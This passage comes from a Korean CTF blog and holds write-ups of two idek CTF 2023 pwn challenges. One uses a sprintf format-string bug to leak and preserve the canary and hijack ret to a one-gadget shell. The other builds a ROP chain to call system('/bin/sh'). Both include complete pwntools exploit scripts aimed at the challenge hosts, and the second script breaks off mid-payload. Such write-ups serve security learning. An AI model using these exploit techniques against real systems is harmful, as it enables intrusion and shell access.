<code>canary</code> 직전까지 덮어보자.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%10$264c&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line"></span><br><span class="line"><span class="comment"># padding</span></span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * (<span class="number">0x26</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x2</span></span><br><span class="line"></span><br><span class="line">payload += p8(<span class="number">0x41</span>)   <span class="comment"># 10</span></span><br></pre></td></tr></table></figure><p>한 블록은 8바이트이기 때문에 패딩을 저렇게 줘야한다. 가독성을 위해 두 번 나누어서 작성했는데, 0x26의 의미는 문제에서 요구한 길이 제한이다.</p><p>payload를 저렇게 작성하게 되면 10번째 offset을 참고하여 264번의 공백 출력 후 마지막에 0x41을 출력한다. gdb 상에서 확인해보면 아래와 같다.</p><ul><li><code>FSB</code> 일으키기 전</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x007ffc4a31cb80│+0x0000: &quot;%10$264c&quot;     ← $rdx, $rsp, $rsi, $rdi, $r8</span><br><span class="line">0x007ffc4a31cb88│+0x0008: 0x0000000000000000        # 6</span><br><span class="line">0x007ffc4a31cb90│+0x0010: 0x0000000000000000        # 7</span><br><span class="line">0x007ffc4a31cb98│+0x0018: 0x0000000000000000        # 8</span><br><span class="line">0x007ffc4a31cba0│+0x0020: 0x0000000000000000        # 9</span><br><span class="line">0x007ffc4a31cba8│+0x0028: 0x00034000000a41 (&quot;A\n&quot;?) # 10</span><br><span class="line">...</span><br></pre></td></tr></table></figure><ul><li><code>FSB</code> 일으킨 후</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0x7ffc4a31cb80: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cb90: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cba0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cbb0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cbc0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cbd0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cbe0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cbf0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc00: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc10: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc20: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc30: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc40: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc50: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc60: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc70: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc80: 0x4120202020202020      0x5207f53f7a984d00</span><br><span class="line">0x7ffc4a31cc90: 0x00007ffc4a31cca0      0x00000000004012fd</span><br></pre></td></tr></table></figure><p>본격적으로 <code>canary</code> 보존을 시작해보자. <code>ret</code>를 덮기 위해서는 필수적으로 <code>canary</code>를 건드려야만 한다. 우리는 <code>FSB</code>를 이용하여 <code>canary</code>를 구한 다음에 써야 한다. 즉, 앞에서 말한 <code>canary</code> 보존은 <code>canary</code>를 leak한 다음 그 자리에 다시 써야하는 것을 의미한다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%5$264c&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%4$c&#x27;</span>   <span class="comment"># 0x00</span></span><br><span class="line">payload += <span class="string">b&#x27;%10$.7s&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # padding</span></span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * (<span class="number">0x26</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x2</span></span><br><span class="line"></span><br><span class="line">payload += p64(canary_addr + <span class="number">1</span>)     <span class="comment"># 10</span></span><br></pre></td></tr></table></figure><p><code>5번째</code> 오프셋은 <code>0x25</code>를 의미하고 <code>4번째</code> 오프셋은 <code>r9</code> 레지스터인 <code>0x00</code>이다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fff9a4022f0: 0x2563343632243525</span><br></pre></td></tr></table></figure><p><code>10번째</code> 오프셋은 <code>canary_addr + 1</code>을 의미하는데 <code>+1</code>의 의미는 <code>canary</code>는 <code>null</code> 바이트부터 시작하기 때문이다. 그래서 <code>canary_addr + 1</code>부터 <code>%.7s</code>를 이용하여 7자리만 가져왔다. 앞에서 <code>%4$c</code>으로 <code>null</code> 바이트 한 바이트만 가져왔기 때문에 <code>canary</code>가 잘 보존되었으리라 생각된다. </p><p><code>%s</code>를 이용하여 카나리를 전부 다 가져오게 되면 <code>null</code> 바이트 때문에 <code>sprint</code> 함수로 <code>canary</code> 출력을 하다가 끊긴다. 사실상 첫 바이트가 <code>null</code>이기 때문에 전혀 출력을 하지 못한다. 그래서 위와 같은 방법으로 출력을 해야한다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0x7fff9a4022f0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402300: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402310: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402320: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402330: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402340: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402350: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402360: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402370: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402380: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402390: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023a0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023b0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023c0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023d0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023e0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023f0: 0x2520202020202020      0x92c29f2c0e8fb100</span><br><span class="line">0x7fff9a402400: 0x00007fff9a402400      0x00000000004012fd</span><br></pre></td></tr></table></figure><p><code>canary</code> 보존에 성공했으면 <code>rbp</code>를 덮고 <code>ret</code>를 원하는 곳으로 돌려주면 끝이다.</p><h3 id="2-ret를-덮어-흐름-변경하기"><a href="#2-ret를-덮어-흐름-변경하기" class="headerlink" title="2. ret를 덮어 흐름 변경하기"></a>2. <code>ret</code>를 덮어 흐름 변경하기</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;AAA%5$261c&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%4$c&#x27;</span>  <span class="comment"># 0x00</span></span><br><span class="line">payload += <span class="string">b&#x27;%10$.7s&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rbp</span></span><br><span class="line">payload += <span class="string">b&#x27;%8c&#x27;</span></span><br><span class="line"><span class="comment"># ret</span></span><br><span class="line">payload += <span class="string">b&#x27;%12$.3s%11$.5s&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># padding</span></span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * (<span class="number">0x26</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x2</span></span><br><span class="line"></span><br><span class="line">payload += p64(canary_addr + <span class="number">1</span>)        <span class="comment"># 10 canary</span></span><br><span class="line">payload += p64(canary_addr + <span class="number">8</span>*<span class="number">4</span> + <span class="number">3</span>)  <span class="comment"># 11 libc</span></span><br><span class="line">payload += p64(stack_leak)             <span class="comment"># 12 stack</span></span><br></pre></td></tr></table></figure><p><code>sprintf(buf, buf);</code>으로 <code>FSB</code>가 트리거 될 때 익스하는 것에서 가장 까다로운 점은 페이로드를 적어놓은 <code>buf</code>가 포맷스트링에 의해 덮힐 가능성이 존재한다는 것이다. 그래서 우리는 실행하고 싶은 주소를 페이로드 제일 앞에 적어주어 덮히지 않게 해야 한다. </p><p><code>ret</code> 부분의 포맷스트링을 해석해보면 12번째 오프셋에서 3바이트를 가져오고 11번째 오프셋에서 5바이트를 가져오는 것을 의미한다. 12번째 오프셋에는 스택 주소가 적혀져 있으며 페이로드 첫 부분 3바이트를 가져오는 것을 의미한다. 11번째 오프셋은 libc 주소가 저장되어 있는데 정확한 값은 아래와 같다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7f 78 55 18 d0 83</span><br></pre></td></tr></table></figure><p><code>aslr</code> 때문에 하위 1.5바이트를 제외하고 계속 변경된다. 우리가 사용할 <code>one gadget</code> offset은 3바이트이므로 5바이트만 정확한 값을 쓰고 나머지 3바이트를 <code>one gadget</code> offset을 사용한다. 물론 이 값은 페이로드 가장 첫 부분에 적혀 있어야 한다. 일단 이 부분은 <code>AAA</code>로 값을 적어놓고 3 글자 썼기 때문에 <code>%264c</code>를 <code>%261c</code>로 변경하였다. </p><p>이제 gdb 상으로 메모리를 살펴보자.</p><ul><li><code>FSB</code> 일으키기 전</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x007ffd1f0d4bb0│+0x0000: &quot;AAA%5$261c%4$c%10$.7s%8c%12$.3s%11$.5s&quot;       ← $rdx, $rsp, $rsi, $rdi, $r8</span><br><span class="line">0x007ffd1f0d4bb8│+0x0008: &quot;1c%4$c%10$.7s%8c%12$.3s%11$.5s&quot;</span><br><span class="line">0x007ffd1f0d4bc0│+0x0010: &quot;0$.7s%8c%12$.3s%11$.5s&quot;</span><br><span class="line">0x007ffd1f0d4bc8│+0x0018: &quot;%12$.3s%11$.5s&quot;</span><br><span class="line">0x007ffd1f0d4bd0│+0x0020: 0x0073352e243131 (&quot;11$.5s&quot;?)</span><br><span class="line">0x007ffd1f0d4bd8│+0x0028: 0x007ffd1f0d4cb9  →  0xd0edc89128c0bcb7</span><br><span class="line">0x007ffd1f0d4be0│+0x0030: 0x007ffd1f0d4cdb  →  0x00001800007f7855</span><br></pre></td></tr></table></figure><ul><li><code>FSB</code> 일으킨 후</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0x7ffd1f0d4bb0: 0x2020202020414141      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4bc0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4bd0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4be0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4bf0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c00: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c10: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c20: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c30: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c40: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c50: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c60: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c70: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c80: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c90: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4ca0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4cb0: 0x4120202020202020      0xedc89128c0bcb700</span><br><span class="line">0x7ffd1f0d4cc0: 0xb020202020202020      0x00007f7855414141</span><br><span class="line">0x7ffd1f0d4cd0: 0x0000000000000000      0x00007f785518d083</span><br></pre></td></tr></table></figure><p><code>ret</code>가 <code>0x00007f7855414141</code>로 잘 변조 되었다.</p><img src="/images/230117-idekctf2023-sprinter/Screenshot 2023-01-17 at 20.44.01.png" width=450/><br><p>이제 <code>one gadget</code>을 이용하여 exploit을 진행해보자.</p><h3 id="3-offset-Brute-forcing"><a href="#3-offset-Brute-forcing" class="headerlink" title="3. offset Brute forcing"></a>3. offset Brute forcing</h3><p>사용할 <code>one gadget</code> 오프셋은 아래와 같다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br></pre></td></tr></table></figure><p><code>\x01\x3b\x0e</code> 를 사용할 것인데 하위 1.5바이트 말고는 <code>aslr</code> 때문에 오프셋이 랜덤이니까 1&#x2F;4096의 확률의 브루트포싱이 필요하다.</p><h2 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># p = process(&#x27;vuln&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;sprinter.chal.idek.team&#x27;</span>,<span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>,timeout=<span class="number">10</span>)</span><br><span class="line">        stack_leak = <span class="built_in">int</span>(p.recvn(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;stack_leak : <span class="subst">&#123;<span class="built_in">hex</span>(stack_leak)&#125;</span>&#x27;</span>)</span><br><span class="line">        canary_addr = stack_leak + <span class="number">0x108</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&#x27;\x01\xfb\xff%5$261c&#x27;</span></span><br><span class="line">        payload += <span class="string">b&#x27;%4$c&#x27;</span></span><br><span class="line">        payload += <span class="string">b&#x27;%10$.7s&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># rbp</span></span><br><span class="line">        payload += <span class="string">b&#x27;%8c&#x27;</span></span><br><span class="line">        <span class="comment"># ret</span></span><br><span class="line">        payload += <span class="string">b&#x27;%12$.3s%11$.5s&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># padding</span></span><br><span class="line">        payload += <span class="string">b&#x27;\0&#x27;</span> * (<span class="number">0x26</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">        payload += <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x2</span></span><br><span class="line"></span><br><span class="line">        payload += p64(canary_addr + <span class="number">1</span>)         <span class="comment"># 10</span></span><br><span class="line">        payload += p64(canary_addr + <span class="number">8</span>*<span class="number">4</span> + <span class="number">3</span>)   <span class="comment"># 11</span></span><br><span class="line">        payload += p64(stack_leak)              <span class="comment"># 12</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">repr</span>(</span><br><span class="line">            p.recvn(<span class="number">100</span>, timeout=<span class="number">1</span>)</span><br><span class="line">        ))</span><br><span class="line">        p.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(ex)</span><br></pre></td></tr></table></figure><br><img src="/images/230117-idekctf2023-sprinter/Screenshot 2023-01-17 at 00.29.59.png" width=500/>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>idek CTF 2023 - Typop (rop)</title>
      <link href="/230116-idekctf2023-typop/"/>
      <url>/230116-idekctf2023-typop/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1839">https://ctftime.org/event/1839</a></li></ul><blockquote><p>While writing the feedback form for idekCTF, JW made a small typo. It still compiled though, so what could possibly go wrong?<br><code>nc typop.chal.idek.team 1337</code></p></blockquote><ul><li>[155 solves &#x2F; 408 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>mitigation은 위와 같고, 프로그램 구조는 <code>main</code> 함수에서 while로 <code>getFeedback</code> 함수를 계속 호출하는 구조이다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">getFeedback</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+Eh] [rbp-12h] BYREF</span></span><br><span class="line">  __int16 v2; <span class="comment">// [rsp+16h] [rbp-Ah]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you like ctf?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x1E</span>uLL);  <span class="comment">// bof</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You said: %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)buf == <span class="number">121</span> )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;That&#x27;s great! &quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Aww :( &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can you provide some extra feedback?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x5A</span>uLL);  <span class="comment">// bof</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>bof</code>가 두 번 발생한다. <code>win</code> 함수가 존재하지만 인자 세 개를 컨트롤 해야해서 사용하기 까다롭다. <code>csu gadget</code>을 이용해야하는데 <strong><del>길이 제한 및 모든 보호기법이 다 걸려있어서 <code>got</code>를 덮을 수가 없어 사용하기가 매우 까다롭다.</del> <mark>(2023.01.18 update)</mark> 착각했다. <code>csu_gadget</code>으로 풀이하는 것이 인텐이고 해당 풀이는 아래 링크로 확인할 수 있다.</strong></p><ul><li><a href="https://jiravvit.github.io/230118-idekctf2023-typop2/">https://jiravvit.github.io/230118-idekctf2023-typop2/</a></li></ul><p>그래서 <code>win</code> 함수를 실행시키는 방향이 아닌 쉘을 획득하는 방향으로 풀이를 진행했다. 첫 번째로 터지는 <code>bof</code>에서 stack, canary, pie를 leak 할 수 있고 이로 인해 <code>rop</code>를 진행하여 libc 주소 또한 구할 수 있다. 결국 그냥 <code>system(&quot;/bin/sh\x00&quot;)</code>를 실행시켜 쉘을 획득하고 flag를 읽으면 된다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h2 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;typop.chal.idek.team&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (1) canary, stack leak</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;survey?\n&#x27;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;ctf?\n&#x27;</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">10</span> + <span class="string">&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">canary = u64(<span class="string">b&#x27;\x00&#x27;</span> + p.recv(<span class="number">7</span>))</span><br><span class="line">stack = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;canary: &#x27;</span>+ <span class="built_in">hex</span>(canary))</span><br><span class="line">info(<span class="string">&#x27;stack: &#x27;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;feedback?\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">10</span> + p64(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment"># (2) pie base leak</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;survey?\n&#x27;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;ctf?\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">10</span> + <span class="string">b&#x27;B&#x27;</span>*<span class="number">8</span> + <span class="string">b&#x27;C&#x27;</span>*<span class="number">7</span> + <span class="string">b&#x27;D&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">e.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1447</span></span><br><span class="line">info(<span class="string">&#x27;pie base: &#x27;</span> + <span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">info(<span class="built_in">hex</span>(e.address+<span class="number">0x14d3</span>))</span><br><span class="line">pop_rdi = e.address + <span class="number">0x14d3</span></span><br><span class="line">ret = e.address + <span class="number">0x101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x12</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">payload += 